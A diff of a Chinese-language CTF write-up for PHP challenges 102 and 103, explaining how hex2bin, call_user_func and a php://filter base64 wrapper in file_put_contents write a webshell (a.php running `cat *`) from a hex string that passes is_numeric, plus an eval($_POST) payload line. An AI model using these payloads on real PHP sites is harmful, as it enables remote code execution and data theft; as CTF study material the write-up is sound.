@@ -172,19 +172,28 @@ pyload=`URL/?v1=1&v2=eval($_POST[1])?>&v3=;`
 ![5](TU/PHP4x15.png)
 
 
-**[substr()](https://www.php.net/manual/zh/function.substr.php)**:返回字符串的子串(从指定位置开始, 返回指定长度的字符)
-**[call_user_func()](https://www.php.net/manual/zh/function.call-user-func.php)**:调用用户函数或方法, 可以传递参数
-**[file_put_contents()](https://www.php.net/manual/zh/function.file-put-contents.php)**:将字符串写入文件。如果 文件名 不存在，将会创建文件。反之，存在的文件将会重写，除非设置 FILE_APPEND flag。
-**[hex2bin()](https://www.php.net/manual/zh/function.hex2bin.php)**:将十六进制字符串转换为二进制字符串。
-**[bin2hex()](https://www.php.net/manual/zh/function.bin2hex.php)**:将二进制字符串转换为十六进制字符串。
+**[substr()](https://www.php.net/manual/zh/function.substr.php)**:返回字符串的子串(从指定位置开始, 返回指定长度的字符)。**把v2的前两位去掉，得到纯16进制字符串。**
+**[call_user_func()](https://www.php.net/manual/zh/function.call-user-func.php)**:调用用户函数或方法, 可以传递参数。
+
+**在call_user_func() 中,v1是hex2bin() 把v2这十六进制字符串转换为二进制字符串。也就是一段base64编码的字符串。**
+
+**[file_put_contents()](https://www.php.net/manual/zh/function.file-put-contents.php)**:将字符串写入文件。如果 文件名 不存在，将会创建文件。反之，存在的文件将会重写，除非设置 FILE_APPEND flag。**可以使用伪协议的**
+
+**v3=`php://filter` 伪协议做用是在写入文件时，自动对 $str 做一次 Base64 解码，把解码后的命令 Webshell 写入 a.php。访问 a.php：服务器解析执行里面的 PHP 代码运行webshell。**
+
 ```
 <?php
 echo bin2hex(str_replace('=', '', base64_encode($_GET[1])));
 echo "\n";
 echo hex2bin(str_replace('=', '', base64_encode($_POST[2])));
 ?>
-
 ```
+**[str_replace()](https://www.php.net/manual/zh/function.str-replace.php)**:替换字符串中的子串。(要查找的字符，替换的字符，在哪个字符串中查找。)
+**[hex2bin()](https://www.php.net/manual/zh/function.hex2bin.php)**:将十六进制字符串转换为二进制字符串。
+**[bin2hex()](https://www.php.net/manual/zh/function.bin2hex.php)**:将二进制字符串转换为十六进制字符串。
+
+**这个数字字符串非常巧妙，可以通过is_numeric():  5044383959474e6864434171594473->PD89YGNhdCAqYDs->`<?='cat *';`**
+
 hex 码前面记得补两个0 (substr)
 然后访问 a.php 得到 flag
 
@@ -192,6 +201,15 @@ hex 码前面记得补两个0 (substr)
 
 
 `v1=hex2bin`
+
+**·103**
+![6](TU/PHP4x16.png)
+相较于102，这里多了过滤。
+这个正则 `/.*p.*h.*p.*/i` :只要字符串里按顺序出现了 ``p → 任意字符 → h → 任意字符 → p``，不管中间隔了多少东西，不管大小写，就会匹配成功返回True
+
+上题pyload依然可用
+
+
 
 
 
